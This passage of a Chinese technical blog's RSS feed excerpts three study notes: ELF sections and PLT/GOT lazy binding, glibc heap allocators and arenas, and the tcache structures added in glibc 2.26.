http://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-v.html
http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html
https://stackoverflow.com/questions/34966097/what-functions-does-gcc-add-to-the-linux-elf
Elf Sections # 常见节 # 我们分析以下几个比较重要的节头：
.text：该段包含的是可执行代码，该段中的数据只可读不可写，该段中的数据只加载一次。 .data：已被初始化的数据，可读可写。 .rodata：已被初始化的数据，只可读不可写。 .bss：未初始化数据，可读可写。 链接相关 # 动态链接过程 # 此处详解以下动态链接过程中最重要的部分，libc 函数的链接过程。libc 中的函数，若使用动态链接，则关键的两个表项时 .got 表与 .plt 表，这种绑定方式又称为延迟绑定。
比如我们在某一个函数中进行了 puts 系统调用，在调用之前表结构大致如下：
.text sections .plt table .got table +--------------+ +---------------+ +------------------+ | [my_func] | | [puts@plt] | | [puts@got] | | | | | | | | jmp 0x400480 ----&amp;gt;| jmp 0x601028 ---&amp;gt;| 0x601028:0x400486--+ | | | | | | | | .</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/glibcheap/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/glibcheap/</guid><description>参考：长亭科技堆的概念
堆基础 # 堆的一些特点：
堆是可以根据运行时的需要进行动态分配和释放的内存，大小可变； 堆的实现重点关注内存块的组织和管理方式（尤其时空闲的内存块）： 如何提高分配和释放的时间效率； 如何降低碎片化，提高空间利用率； 常见堆的实现：
dlmalloc：通用分配器； ptmalloc2：glibc 函数，基于 dlmalloc，支持多线程； jemalloc：FreeBSD、FireFox、Android；内存占用更高，但是在多核多线程下的表现也最为优异。 tcmalloc：Google Chrome、Golang；针对多核情况有所优化，性能有所提高，但是内存占用稍高，大内存分配容易出现 CPU 飙升。 libumem：Solaris； Windows 10：segment heap。 相关资料：
https://www.cyningsun.com/07-07-2018/memory-allocator-contrasts.html#%E7%B3%BB%E7%BB%9F%E5%90%91%E7%9C%8Bptmalloc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86 glibc heap # 相关结构 # 下面介绍管理 glic 堆的各种数据结构：
arena # arena 指的是内存区域本身，并非一个结构：
主线程的堆由 sbrk 创建，称为 main arena； 其他线程的堆由 mmap 创建，称为 per thread arena； arena 的数量受 CPU 核数的限制：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/glibctcache/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/glibctcache/</guid><description>参考资料：
http://p4nda.top/2018/03/20/tcache/ https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/ Tcache # 介绍 # tcache，全称是 thread local caching，是 libc 2.26 版本中新增加的内存管理机制，属于一种用于加速 malloc 分配的缓存机制。
它由 64 个链表组成，处理逻辑位于 malloc 函数和 free 函数中，优先级较高，会先于全部的 bin 来处理，当缓存链表装满时，分配方式就与之前版本的 malloc 相同。
源码分析 # tcache_entry &amp;amp;&amp;amp; tcache_perthread_struct # 在 tcache 中新增了两个数据结构，它们的定义源码如下：
/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache. */ typedef struct tcache_entry { struct tcache_entry *next; /* This field exists to detect double frees.</description></item></channel></rss>